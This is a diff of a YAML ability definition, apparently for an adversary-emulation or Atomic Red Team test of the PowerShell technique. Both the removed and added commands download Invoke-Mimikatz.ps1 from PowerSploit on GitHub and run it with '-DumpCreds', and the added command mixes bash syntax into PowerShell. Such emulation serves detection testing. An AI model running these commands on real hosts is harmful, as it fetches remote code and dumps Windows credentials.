@@ -8,9 +8,15 @@
     name: 'Command and Scripting Interpreter: PowerShell'
   platforms:
     windows:
-      sh:
-        command: powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1');
-          Invoke-Mimikatz -DumpCreds"
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-Mimikatz.ps1")
+          { exit 0 } else { exit 1 }; then : ; else New-Item -Type Directory (Split-Path
+          "PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-Mimikatz.ps1")
+          -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-Mimikatz.ps1";
+          fi; Import-Module "PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-Mimikatz.ps1";
+          Invoke-Mimikatz -DumpCreds'
+        cleanup: Remove-Item "#{mimpath}" -Force -ErrorAction SilentlyContinue
         elevation_required: true
   plugin: atomic
   singleton: false
@@ -28,6 +34,21 @@
         description: Mimikatz url
         type: url
         default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
+      mimpath:
+        description: Local path to save Invoke-Mimikatz.ps1
+        type: path
+        default: PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-Mimikatz.ps1
+    dependencies:
+    - description: Invoke-Mimikatz.ps1 must be on disk
+      prereq_command: 'if (Test-Path "#{mimpath}") { exit 0 } else { exit 1 }
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (Split-Path "#{mimpath}") -ErrorAction
+        Ignore -Force | Out-Null
+
+        Invoke-WebRequest -Uri "#{mimurl}" -OutFile "#{mimpath}"
+
+        '
     technique_created: '2020-03-09T13:48:55.078Z'
     atomic_guid: f3132740-55bc-48c4-bcc0-758a459cd027
-    import_timestamp: '2026-09-04T06:56:11.017760Z'
+    import_timestamp: '2026-09-05T06:41:05.149907Z'
